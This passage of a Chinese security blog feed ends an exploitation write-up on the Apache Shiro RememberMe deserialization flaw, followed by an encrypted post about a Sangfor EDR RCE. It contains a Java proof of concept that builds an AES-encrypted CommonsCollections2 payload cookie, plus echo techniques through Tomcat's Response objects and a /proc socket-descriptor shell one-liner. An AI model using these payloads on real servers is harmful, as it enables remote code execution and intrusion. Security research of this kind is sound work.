punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Serializer<span class="token operator">&lt;</span>Object<span class="token operator">></span> serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommonsCollections2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token string">"&lt;Exec Command>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">"&lt;INPUT KEY HERE>"</span><span class="token punctuation">,</span> serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">encrypt</span><span class="token punctuation">(</span>String key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyDecode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        AesCipherService cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>objectBytes<span class="token punctuation">,</span> keyDecode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="gadget-异常"><a href="#gadget-异常" class="headerlink" title="gadget 异常"></a>gadget 异常</h3><p>这里可能会有人提到，为什么很多 cc gadget 无法使用呢？简单跟一个 cc4，会发现报错提示找不到<code>org.apache.commons.collections4.Transformer</code>，而 shiro 1.2.4 默认使用的 commons-collections4-4.0.jar 理论上是可以的利用的，报错原因在哪里？</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979087078911.jpg" alt="-w1501"></p><p>我们回到反序列化最开始的地方org.apache.shiro.io.DefaultSerializer#deserialize，注意这里调用的是ClassResolvingObjectInputStream.readObject()</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979098205251.jpg" alt="-w699"></p><p>ClassResolvingObjectInputStream继承自ObjectInputStream但重写了 resolveClass，最大的不同在于加载方式</p><table><thead><tr><th>-</th><th align="center">ClassResolvingObjectInputStream</th><th align="center">ObjectInputStream</th></tr></thead><tbody><tr><td>代码</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979099399026.jpg" alt="-w724"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979099587009.jpg" alt="-w691"></td></tr><tr><td>加载</td><td align="center">ClassUtils.forName<br>实际 ClassLoader.loadClass</td><td align="center">Class.forName</td></tr><tr><td>代码</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979102998850.jpg" alt="-w918"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979106277660.jpg" alt="-w829"></td></tr></tbody></table><p>那么两种加载方式的区别是什么？这里可先详细阅读这篇文章：<a href="https://www.jianshu.com/p/83cbbd0b8b10" target="_blank" rel="noopener">ClassUtils详解</a></p><table><thead><tr><th align="center">-</th><th align="center">ClassLoader.loadClass</th><th align="center">Class.forName</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">获取指定的 classLoader</td><td align="center">自动获取 classLoader</td></tr><tr><td align="center">2</td><td align="center">只能将类加载到 JVM</td><td align="center">可加载到 JVM 并初始化<br>(ObjectInputStream中设置为 false 未初始化)</td></tr></tbody></table><p>还是没搞懂问题出自哪里，另网上有提及的一处区别（<strong>注意！有问题！</strong>）</p><blockquote><p>是否会解析数组类型<br>1）Class.forName会解析数组类型，如[Ljava.lang.String;<br>2）ClassLoader不会解析数组类型，加载时会抛出ClassNotFoundException;</p></blockquote><p>但是经测试WebAppClassLoader是有能力解析数组的</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979768116938.jpg" alt="-w631"></p><p>最后发现关键点在于org.apache.catalina.loader.WebappClassLoaderBase#loadClass(java.lang.String, boolean)，在调用 Class.forName 时<strong>指定从父类向上搜寻</strong>，导致找不到<code>[Lorg.apache.commons.collections4.Transformer;</code>类</p><table><thead><tr><th align="center">参数</th><th align="center">parent</th><th align="center">this</th></tr></thead><tbody><tr><td align="center">ClassLoader</td><td align="center">URLClassLoader</td><td align="center">WebappClassLoader</td></tr><tr><td align="center">测试</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979885531644.jpg" alt="-w1260"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979885797767.jpg" alt="-w1260"></td></tr></tbody></table><p>关于WebappClassLoader与其他 ClassLoader 可详细阅读此篇文章：<a href="https://www.cnblogs.com/aspirant/p/8991830.html" target="_blank" rel="noopener">图解Tomcat类加载机制</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15979903825787.jpg" alt></p><blockquote><ol><li>WebappClassLoader：各个Webapp私有的类加载器，加载路径中的class只对当前Webapp可见</li><li>tomcat 为了实现隔离性，没有遵守双亲委派这个约定，每个webappClassLoader加载自己的目录下的class文件，不会传递给父类加载器</li></ol></blockquote><p>而<code>commons-collections4-4.0.jar</code>位于 webapp 中项目 /WEB-INF/lib 下，在没有其他额外配置 CLASSPATH 的情况时，默认只有 WebappClassLoader 才能加载</p><p><strong>所以 Tomcat 为什么搜索指定父类开始？这个设计就很迷🤔🤔🤔</strong></p><h2 id="V-回显"><a href="#V-回显" class="headerlink" title="V. 回显"></a>V. 回显</h2><p>在遇到几次目标后，会发现有的设备是不出网的，哪怕碰撞出了 key 也不清楚是否正常执行了命令，这时候回显的能力就很重要</p><p>因为对回显没有研究，看了其他师傅的文章，按照<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">00theway师傅</a>讲的，目前公开的大概有以下几种方式获取结果：</p><ol><li>报错回显</li><li>web中获取当前上下文对象（response、context、writer等）</li><li>可以出网情况下OOB</li></ol><p>利用效果比较好的有以下两个，前者适用 Linux/Windows Tomcat，后者适用 Linux 各类场景，各有优势，按场景利用</p><ol><li>基于 Tomcat Response： <a href="https://koalr.me/post/shiro-lou-dong-jian-ce/" target="_blank" rel="noopener">https://koalr.me/post/shiro-lou-dong-jian-ce/</a></li><li>基于 Linux Socket： <a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">https://www.00theway.org/2020/01/17/java-god-s-eye/</a></li></ol><h3 id="1-Tomcat-Gadget"><a href="#1-Tomcat-Gadget" class="headerlink" title="1. Tomcat Gadget"></a>1. Tomcat Gadget</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15981176541010.jpg" alt="-w1100"></p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>编译 java-object-searcher 为 jar，方便引用</p><pre class=" language-shell"><code class="language-shell">$> mvn clean package -Dmaven.test.skip=true</code></pre><p>拉取 Tomcat (非源码)，创建一个 Tomcat 项目，并自行创建一个 Servlet 用于断点调试</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15981590274384.jpg" alt="-w1443"></p><p>测试 Tomcat 8.0.39 环境下实际只有一条 gadget</p><pre class=" language-plain"><code class="language-plain">TargetObject = {org.apache.tomcat.util.threads.TaskThread}   ---> group = {java.lang.ThreadGroup}    ---> threads = {class [Ljava.lang.Thread;}     ---> [5] = {java.lang.Thread}      ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}       ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}         ---> handler = {org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler}          ---> global = {org.apache.coyote.RequestGroupInfo}           ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>}            ---> [0] = {org.apache.coyote.RequestInfo}             ---> req = {org.apache.coyote.Request}</code></pre><p>在这里又遇到了 cookie 过大的情况，解决方法请看这篇<a href="https://xz.aliyun.com/t/6227" target="_blank" rel="noopener">缩小ysoserial payload体积的几个方法</a></p><p>使用 javassist 加载目标类，导致体积过大</p><pre class=" language-java"><code class="language-java">pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>TomcatEcho<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>CtClass clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>TomcatEcho<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15981183428132.jpg" alt="-w676"></p><p>转变为使用 javassist 直接创建类</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15981184068390.jpg" alt="-w656"></p><p>我这里只是实现 Demo，没有对各个 Tomcat 版本以及 CC gadget 做兼容，这位师傅实现对利用链更广泛的兼容：<a href="https://koalr.me/post/shiro-lou-dong-jian-ce/" target="_blank" rel="noopener">Shiro RememberMe 漏洞检测的探索之路</a></p><h3 id="2-Linux-Socket"><a href="#2-Linux-Socket" class="headerlink" title="2. Linux Socket"></a>2. Linux Socket</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15980718016937.jpg" alt="-w1145"></p><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>基于 Linux 万物皆文件的性质，对于每一个链接 socket 都有其对应的文件描述符，通过直接向文件描述符写入内容实现回显</p><p>有部分文章使用是<strong>尝试通过 IP、PORT 进行过滤获取 inode 值后，再获取 fd 写入</strong>，这个方法有一个很大的问题在于如果目标位于负载、代理之后的复杂网络，是没有办法筛选出有效的请求源，导致方法失败</p><p><strong>所以我采用通过获取所有有效 inode 值，再获取 fd 组，统一尝试写入，突破复杂网络，实现回显</strong>😈</p><p>首先了解下 /proc/self/net/tcp</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/55ea3bd4/15980738788715.jpg" alt="-w722"></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/net/tcp_states.h</span><span class="token keyword">enum</span> <span class="token punctuation">{</span>    TCP_ESTABLISHED <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>    TCP_SYN_SENT<span class="token punctuation">,</span>    TCP_SYN_RECV<span class="token punctuation">,</span>    TCP_FIN_WAIT1<span class="token punctuation">,</span>    TCP_FIN_WAIT2<span class="token punctuation">,</span>    TCP_TIME_WAIT<span class="token punctuation">,</span>    TCP_CLOSE<span class="token punctuation">,</span>    TCP_CLOSE_WAIT<span class="token punctuation">,</span>    TCP_LAST_ACK<span class="token punctuation">,</span>    TCP_LISTEN<span class="token punctuation">,</span>    TCP_CLOSING<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">/* Now a valid state */</span>    TCP_NEW_SYN_RECV<span class="token punctuation">,</span>    TCP_MAX_STATES    <span class="token comment" spellcheck="true">/* Leave at the end! */</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>关注到 connection state 标志，通过判断是否为1就可以筛选正在传输的 socket 的 inode 值</p><p>之后通过筛选 /proc/self/fd 中 socket[<inode>] 对应文件描述符值，遍历尝试写入即可</inode></p><p>下面是我用来筛选的语句 Orz</p><pre class=" language-shell"><code class="language-shell">$ > inode=`cat /proc/net/tcp|tail -n +2|awk '{if($4=="01")print}'|awk '{print $10}'`;for i in $inode; do fd=`ls -l /proc/$PPID/fd|grep socket|grep $i|awk '{print $9}'`; if [ ${#fd} -gt 0 ]; then echo -n $fd-;fi;done;$ > 97-57-</code></pre><p>原本是想通过全部由 JAVA 原生代码实现，结果发现生成的 Payload 长度超出了 Cookie or Header Length 限制，除非另利用 gadget 去修改，否则会触发 ERROR 400，后面发现用 shell 直接过滤 fd  更方便快捷</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://xz.aliyun.com/t/6227#toc-4" target="_blank" rel="noopener">缩小ysoserial payload体积的几个方法</a></li><li><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">通杀漏洞利用回显方法-linux平台</a></li><li><a href="http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo" target="_blank" rel="noopener">半自动化挖掘request实现多种中间件回显</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一次遇到案例，利用部分工具无法有效实现执行、回显，于是有了此篇&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>深信服 EDR RCE 简析</title>
    <link href="https://blog.sari3l.com/posts/6712089c/"/>
    <id>https://blog.sari3l.com/posts/6712089c/</id>
    <published>2020-08-18T03:23:31.000Z</published>
    <updated>2020-08-26T06:40:20.190Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="13b1a95095ce0140bc89459d5b30456a4f886b4899a85f8535ac87bb570ae51f">1ad572fb57cc2956496dcc52e0ea2dafde82954dd73786338ce22b313cc2edf7ae82eedee8487532a9704898b35bb4f4a2a5460f41189e96c3aafa27e4c11f66fab69ef5fade1a3a2a5d151255daab0a483521b64c1421fb5ca0bb3b80f3e146052d737e595a9427d19d8f4f5c1a246ab4f6244d2e113690cf68b65f2128507ded19f269efe2b7e84c16f1180d47c13c319f5dc81a981ddf3c31102d12b19423dde7793bb0462b1c0245f038c413e6c60850f402ec462f1a6b5e1f0ac6d521a30ed3de4cfa3d5c746e80386d1a0c32396bce36f6df4ff5c3d68c31b3f1d2318b12ad95aa21e88ae77304b044615115555de18a072e7c8a17275bc6f21837c9464856214cc4ec2d5928fb6f3c9977a40d21705861c4d4fece39583b69c74b2571fd2f756ce260a6dfdd577e6423d3f16123846e34966f7fc9dbb83a249aaa4ffb5faee3cc00db83ebcc7d3f74b945b959045b7e1b001ab5a012b694bfbc746ae1d3a11a352d3d41023782bc3b65df538e144bbb23286d201891d1876e8ca4d0952835be04c799f48a07cf362bbe7dcdc99f53358eae5834d0f1f0336b4084b668ac20d882f2f0627143ebb6e22b4476b7cb3168bb3fe93b68717a14aaa435c3ceb5d3d26831db10654d4334447fba55aad139f6e3c1c3c660cf50b2172d4439545ecf6500ab852484594d8577cc3bd6adf53c16b3a2f7f9a247660f75cfacc95de488ab176a32eda9ae9db86396936d16d1056015d9e92e48f0de3b3d2fc565c7bd474c7f82eac9d47b3ca2ec29d6d3f7d2263a2883576d33395877d52f5cddff21427de7a91879105e7b69cac5f32cd54a55bab4c04cb12ca4b7251e1e6db2d39ad5bb9c9f7cddd6d1fee6997b169afa85a48c75c241e4ba182cbb44c0bde95349bc7fe60c18afdb4b7bbb584b5130652de66e19681a4cd4aba3d726763027a295c986e2f5335f2ce676d654bdba48608f2834f31e5517d52be4e119138ede71d7d8dcfc11b99280f4b1e1dd8bd082b105c48c29135da87316105420f19af98471814872f53904aa2d382d2342cc1dbc6d062d0b86a48b36c536501cdb784c291ab5dc147d9ccaa47e917e8fe8075491809c5fa22d216895fc6c2fa8ee597f453eba441b8bbd94b6332950e9c6b2042c98514f9c112b375686edabb8ca3f6b1768ea83b3512f18955117ef6f5ae353d5cbaa263da618ce0693d7662aee80e8252c7ede094f953d9a117558d46465fd18d646a226ff6d38368b1f0db34509ac77c490140021931a1d29e9b54e1bd2d6525e23cd25309356aacfd2b1464562c818a458aaae5d4d1871d415a03ff18f0e23e3bc8f0418d5126937c258f0e6189e9070fbc24dba108acb3e086b23f36eea86f61902adb210d91707cb5b9f4fbc39daffb523aef61001647c168168031cd58a0d4a383a3a7c7b1040c38b3e49bee8c4b5f056b5dd610d9005322c1cc341b6bf67da08574c736629a43a8fb0da98657e0dd1d5ff10e846246be119bd840f24b067c33dfffcce04378bbc11d682e499820c0ef45c39310bb0ff8579c1e26e186774d5e3e650ce2454fd6d57c66334813325174dd04c14bf18eea4c6ad82ed5e0ea446231a5e188783d3bd45a19e051e779d75f5553ef9ee11a61d2023baabdaa8e8074a3320e165cc859e5f5559aaa9b94457bdf01a5769c3118419c305025ffbc75c1a090b5f94a160ed0ace23e61cf2760d1b0cdb1962c6248d3897e4fa5bb282c5a2508ed31a955e789ec24675f76d5cbf5aa9d01a53debc669a7e9b03f02be56f85ea7cf9a0472cccd147ab4d651e50676728b316853c1db142b92e0b1626256e83f584227738de7b65735b6c9d66173272b337b6e380ff5dfd1f70b6225994b48630119d07a2f2812d674cf55395cc867e4e27ef7de8ec335640ba06d85ef9b551f0c4fc7ebe0049db79385327f420b24c967cfae572a7365cb473d324c6adf924e4982a5375dd88d3bbc2944e810780408eb102dca3c24c1d971945fad26d97498bf9780f6a5299f63b77d782ab45db3efb056f3fd282b9e0f7675f8ca7023b597ac103e292a30f60fb040abae29c3c718a7cba6b8324369896ba00fb9c9d8d666d241dc15c5f899d6ee7e2682e87964d550ce59475a5c37a69771747fd429d68bab5a1b4e346b0d31728932cd7810603ee8f07ae23962c442041e8819608d1f53417d6c019ee7a5e4513fdcf25c48acbf59c0c98351350c3a5599f7bf98cb4191a41b83b875b7453eb3fb4a9574ff7d947764f55de1881b1a888dbc551f4942a372eeb2ab7aa00fe374915fac792e85ee1443959f180482b4e0e35cc956db3311f72f5c8846cbb3d2298f660591951bc63313bf9031f31aa6194f62faba967d6f0d65d039467717bf64d1a0011a3d11f98e2af532c39c4c4d771c2f40979d622b8cdb6edd1f2768dfd366f8dc2c3a98f5fd71549ba3caa7bbcd57207a7281fa1154858043dac91fc4bacec22716949442ff30d8221a60ef0911346f130db073a11cd7757088f578207decbc56185c2805a7145fd1230755aad90dc210a5643af325419d8d38e557675914bfd12dfbb2f41c6b80ed9e3d218736a6a2fe6c050f997fcc9bf85ec04b3d9b8183bc89c86bdd62c6c7ceaab5f269bdbdb412b91a3c6657db2699db79fbf87710799f23b6b7a64cb83bedb025a7fad7eea2970cfb6fd5288455c33ebed83db70e67702b0af424b64784b98defaa44f51d33d7611ec437cb1d90a678e62fe2be2b04b59f329caec0b0841504938bd9bda4602bd2b8b12421f34274b45003d94959067eca5dab7c11fddd907bd2b61a0b1524b5394a650e64e465c3ec176c2d07fc8ede46dbd27bff52e83d6785cfcc80e150117313850e1de2056871911a7d101b0a97fc0e3a73886815a1a891c9d72ddb80a57953d3029dbe8ebafa28cfa8237e88fe4b350928e561e2596781cd45f750815ab825eb0622997db2ec1d8b5ecde0b6e3e921d3775c0bba978ef7c541be0e57c8586125d7bbeafe65a37d6cdd17bde1780972dbbe0de660100f07f74d7748d03385bd35115d30c8520a5eb6477e3a1b80d5299d723cb386cbd797aa58ed100ac69f9996489f99556dd78e731916f9e891dba5e98a2b54abcd2491d1c386bc86b3fe3fdeb02a998643fd645f5c710a8a8ea70aba712462c14487506936202fae3b6b02816fdff011cb9b0d16f5afb88d6b8ebab830af75122ab535973348a63d4445973d2824eaed74803ee1d48bec3eaf00250f058317f17765493b0af723392e9e3fb19cd800c7cfdaea07276ba0a8c1ffb4b3b2fb537f75abb6dd337c2579a161a7729c8245b0857f137f53ff47cc2288147039f28848f44cf0685f007db85fb98690982d5b53c0e0e779bce005c0e2ed8c93ccb913d9385e0b632e9a6d2e71f181918ee83896148a7ddf96d87448373f946be5866baf79ae67b8cfc7f9dcd22ff88ee4dbbe313fb7f2adccdeb0fc9399eeeda907e4e0607120d3cee2182d24fecef660ad94d05888e8673349c559cf77e95fcc9ee34e8eecfd3bfa84bcee261b1bb0a9fde5f5da39dd5a1a46c8adaceef6d3bf70daa831a24ecfc1ce9bab066f425e3e5c7a2a8716ec9eeeedddff67a6b4bab1eab5adfbcdbc4ccab4fe8bc5327fb5bcdab31e30089dda399bdf02e4ca0aa55b8c73768e7af3dd159252b5e46ec86028ebae0c6bc2f7eda3be63ea1b36a0f89430731873fc0253708d06bb032df47e3de7e468936123a59c8622063f3a91daeb6402a52cc8cd40fef32c7ea7001c4a53f918fa52d2259ec41f90daf62d6a81331cb3c516b8809cc3bc8a37583ae5f3be55af45fa59d57a86a534be399cc4889602e01d09320af16d64b1649e91ab9f84735f068d27111178eb0c5b819295d3e62d1b985f75f4ec3d4a39bf01caa05c4254aafa019b46c907f450203b9dc3ba37837941a40560a033261cee76ba23aa01e084f44b9454359e893a0e69ef990e36847eecb9fe63d3284abaf567dca2e93cf9d6c77ae94ff4a826e5a162bd7b3e935769adf9d1b1d55330d2c53fb0e53c075a24fc4b6fe10a7d17c18dac8aeb2ce3435c1dfcf273922028020db5b16773f559794255b69379bc147abfbd2ea6b4ba2c3bca6658ee04376178d10232b7246c7e1af42c40764583db993697debd0c0bee951e5f0c213364f718fb4641e026b7e011647659220cd98eecf563b417c0e860e7a4646766bba9035f7bf7af20c4a29e11303e16fbfdba4eb1fdb30c09b2cefbc733cc3483e057f38e1390d13088ee9556bcaca37f138ccfcc8241840d6f6a561df042172afff75d4134dcf6927cffbfaca13df7a582284f149986cf9a8edae5354dbc6e07f6f9b9df82a1aae0cffd76e54d45dbdf46e321b94cfa3d1e707e3a2d5764f24297d2a8e7c22119dab47a93384dd4574d513f7daf3ee34b46c899a0981ece5d44a3e3efaf3b5688d8ec451dbc4ba3a786ee0c2bb4adc4540d28760761497345b11261330a8c7603830e9c8afcde6a3f75da6e9af8d92a4f8fbfadc55fee14855847a239ba5c5f63a62a22c76f4e38a33bcbe9d0711549a425435ea044992c6566f1957392df83ddbfcc49da2e9fa9fd3cf99fd358943adff920f1b9f8d5cf0d80428de060292037ba0a8a65acf6b8b85745ce7559afa5afce32c8a172d80dc67b34465fc10f99d5e852bd03b9583beb31da77101c676bfe6df02a3b10f96d8b390ed9b8d23fad264e51d3ee1dc668272e40cd2ba70ba6d28270556f49c07f537712e7503f0cb6639585fc38b1a7966bfd3cdcb1862b4f8542f78258b515328c43a95990101b657a2a9f830001c0ccd80c6b4064d91236af5605cf7ffe9709608b17e2cc6dbe61a31032dc9e6bb0d7c564307a7985531ec152ada7c20621d0866754d3a61cc3a1dce6ad01b977aba8a33c14164f08c3bd05382220d8c6400f6641c76be41d1ce19fe45909299ef071366bd9d6dbc9ab38224678f939445c9a65bd89f8b423d46af1e6c9bbf73e887222e092152087601c6a7eab5c09d87d3c635c92085c8d30fbfe46db11362361e98cc88e068134324146f5d60050b6fec2cd7b0ed9b87250e3e593271dafbc964eafaf14a44c10b4c5f2dc72a7165124b4e8d89b515a551bf4713f6ae2918f7b062a057d0ce92bf8fd00fe7d24b5ba66b323bdc809d7260b2c39a59eed89bcd954f0bf6785a14dc2b17977d9c8c6affbf078c6dff122e2306a6fdf9e68e3b430f2cf4a4f0377202cde938319757c321d1684a9c54ff246335c62c36c68f82d18c97fdba0f5ee6ecce3a28603094827bd20b9143008f417dcf70539160abeb7a7c393132f16cb6e0b8c2c7db69c7b77667da6ba837e3546a96415255867339873ac0c44802d4e043bcf163555ccaf87c06f05454fd1d5923cd984eae7c15a94f7db32c94aac52156e2381eed6924a8a6ab5a33a4915f06559330f0b8bb59f45a00d646337a67f6fb98447c6ebbbda001f9ce8e79f35285b18f760191c69e81350cd6d959480243135b4f8a515899d8b09d9e5810067330f5938bd702735676f10b00ba7e8aea6ce5d1fdde9c9ff038531afa4b940f155964dc54716d9c876d6f36b4b246e75565d00bf27b9bf20331d4a3ca192fedef6912495f812e83ae9a925e5dcef673723eda2c6054d33da359cf82810ca12c2ef9a923f2f7bf57a376d2bb148ce04d606cc4bdf578a43338b75549eb6e345b138b9aaa6bf7286c5204b19453338f3cbaa9e0a4e03d4337383f6a6e29ed5a6d7109d2ac7f2ac05a1245865bc568982b0279e70a047f389024b94fa6c33bf910ef5046275559aadb9d33bd3e5e0d1337bae4ee9c4d34a37074afbf66bdd567d96f712a669fdb68b4e902396e0823595cc9111f4bc1cbd1bce6a4dc016b537676e06b69c992f1b68a17bb97524ea57a34f5323b614c4e74ea755ba2e0cc5119d40ef056afc761bb36f59ff3b255ff1e336307cefe12b7a1dcc0ee33b37bc7fa1141ce3edb1d4a6a1cbe60f4c1eab2f263933fedc5be1d5cf177f801e4289ba8d5a1c813891ff59a1826d048fc423bce9d247dc46b0ee7ccdb91623d1ffaf17485c6d0f7062ef6e74fc260601e28477dadff262d503c05b02e484da62ef8fe690e2cac160bdbe6748ab7bd039e12580395b740c2edbc137fc75a94d4bb6e9070f8194993db969e83d0f8e14745ea5c9632760d99991dd69c127f3334ce2f97c073b44b801029b95285b2c517949d1499096ca02503d2f66b3f545ab670bfb044b39c6ca3843bd04ef185472da9a59fd2ad20a40b9da7f657ba46d1e9461a5b91641d9fed1c9a8e2927afd526c4b152bad16b55a9bf016d12581b3dad4db1a15197dff11afd508dc3066373c381bbf888db825700faca9aa34d8c3927b823a2fd20672c728e5d32501f06062f7c6fa693d0dc6d4d9a5654aa4b55b3756663d3d0c43e03690a02f936a5cdc0fe07d7d6740b46a2ce886205f0494a9b68cf65b8df4e29ae962997f3ada4ad091d9dff001b47fee3859dcd806bdb3c6f6882a44eb9ca186713bc037e39ac22f548c05f3b3a44cfa97aa2f1602a97e6e4219a0b502920db6d53267d1da858f2db7fed6bee0ca62a799d960c76a0e6633ed9dad4c7af395ab75a8375d83382cb1a9acb403537929c7af0cc006fd39bec7dd13081d7c455b5022b91600b12f896158db3c2cddc82f7f40c6a4ca0e55ba2abbc4b15b0fcca9cb1d3b86cdd7e95fa4f06e58c29ae3047eb3ed063dbf3c1bcd49775b4e2682bf2128fd64c060d09184f62effac13985a8a2756d8a250850f7ff28e3f5867f4bcef32d06319abcc45d490f15dab6b45d6a0a8d6120c30d0f62d4f1cdf24e815bb8937b7176d55a80e8deb485ca2475449c8df9e5f7aeacea1108a6f37f6aeec5afac46a82f3eb0d05a97df3ed9c7046e42e36c9c56b50ebaf2368c144addaf777522548eed5c0e74722a9bb37c084ad767282c89123d7e4f26d63c0bd41817dbf4fc13f8a8f8b9e11201a5da209aff83de0f268299c668b8fce74766208a2bd109571bae4284bf82779261b1b2cc8da3c0575623dfe38a882ca56822ce5f7a72db1a3113ba089e913d04c3ba9e11a7103cf5c454adb933f1bca5dd7e11cc4c434a43c9d9b068102f392dbd095fade91f8fd73e3cb32f799f9f4253b5fdbb4961a19debda19fc2c6a19a1432dd8768c1a4f245bf3abb3175d9969905c72aec33762d4ff33186d95a396fcc9bdfabc223cf5d0d973d6ec3556e2dca34e8b06472a10dd346023d4baa5223885e069eb515508d26c0a8647d4b49133d8e7243d7c292c3276c66cb22755dbef200f1ff23962b9eaabe793de34753b01447d97da920f70338c85cb211530d11e55235166dc8dc39ead95fd8a650175fc7840f0e69534adc646bfad9d41838a8cd19b81979929c6f1a7525e2a20070a52bbebd60dc556143f7b6ab681b097e6793